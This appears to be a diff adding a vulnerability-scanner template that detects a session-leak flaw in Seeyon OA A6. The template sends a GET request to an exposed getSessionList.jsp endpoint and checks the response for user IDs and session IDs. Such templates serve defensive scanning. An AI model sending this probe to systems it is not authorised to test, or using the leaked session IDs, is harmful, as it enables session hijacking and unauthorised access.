@@ -1,0 +1,21 @@
+id: seeyon-oa-a6-session-leak
+info:
+  name: Seeyon OA A6 Session Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak,seeyon
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<SessionList>"
+      - type: word
+        words:
+          - "<usrID>"
+      - type: word
+        words:
+          - "<sessionID>"
